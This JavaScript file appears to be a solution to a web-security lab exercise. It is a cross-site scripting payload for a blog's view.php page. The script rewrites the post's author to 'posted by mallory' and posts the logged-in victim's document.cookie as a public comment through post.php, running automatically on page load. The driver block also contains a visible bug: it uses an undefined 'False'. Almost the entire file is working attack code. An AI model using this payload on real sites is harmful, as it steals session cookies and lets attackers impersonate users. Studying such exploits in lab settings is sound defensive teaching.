//changes the header of the comment to match the name mallory
function changeHeaderData() { //part a solution
	//Check if the URL contains the segment view.php?id=
	if (window.location.href.indexOf("view.php?id=") > -1) {
		//Get the URL data from the URL
		URLData = new URLSearchParams(window.location.search)
		
		//Get the ID value from the URL
		idValue = URLData.get("id")
		
		//Check if the URL has a value in the id segment
		if (parseInt(idValue)) {
			//Change the document header
			document.getElementById('author').innerHTML = "posted by mallory"
		} //END IF
	} //END IF
	//If the above conditions fail, return nothing
	return
} //END changeHeaderData

//returns a string representation of the id value for the view.php request
function getID() { //part b solution part I
	//Check if the URL contains the segment view.php?id=
	if (window.location.href.indexOf("view.php?id=") > -1) {
		//Get the URL data from the URL
		URLData = new URLSearchParams(window.location.search)
		
		//Get the ID value from the URL
		idValue = URLData.get("id")
		
		//Check if the URL has a value in the id segment
		if (parseInt(idValue)) {
			return idValue
		} //END IF
	} //END IF
	//If the above conditions fail, return nothing
	return
} //END getID

//Used to leak the cookies. Assumes that user logged in as Alice is running the script from Chromes JavaScript command line
function leakCookies (postID) { //part b solution part II
	//define a new request object
	var xhr = new XMLHttpRequest()

	//Open a POST request for a blog comment post
	xhr.open("POST", "post.php", true)

	//Send the header information with the request
	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

	//Open function upon state change
	xhr.onreadystatechange = function() {
		if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {} //END IF
	} //END state change
	
	//Send a request to set a comment as Alice
	xhr.send("comment=" + document.cookie + "&form=comment&parent=" + postID)
} //END leakCookies

//check if the URL is under view mode
if (window.location.href.indexOf('view.php?id=') > -1) { //driver code used in part c for script in exploit5.sh
	//check the url data to obtain the id value
    var URLData = new URLSearchParams(window.location.search)
    var idValue = URLData.get('id')
	
	//check that the id value is a valid int
    if (parseInt(idValue)) {
		//set the author of the article to be mallory
        document.getElementById('author').innerHTML = "posted by mallory"
		
		//checks if the window is being loaded for the script
        window.onload = function() {
			//unloads the cookies onto the message board
            leakCookies(getID())
			//checks if the page needs to be reloaded
            if (window.location.hash == False) {
                if (window.location.href.indexOf('view.php?id=') > -1) {
                    window.location = window.location + '#loaded'
                    window.location.reload()
                } //END IF
            } //END IF
        } //END onload
    } //END IF
} //END IF

//Driver code below can be used to run script as well, if we are not running from a window
//Changes the title of the article to be set to a new name
//changeHeaderData()

//Get the cookies and print them onto the comments
leakCookies(getID())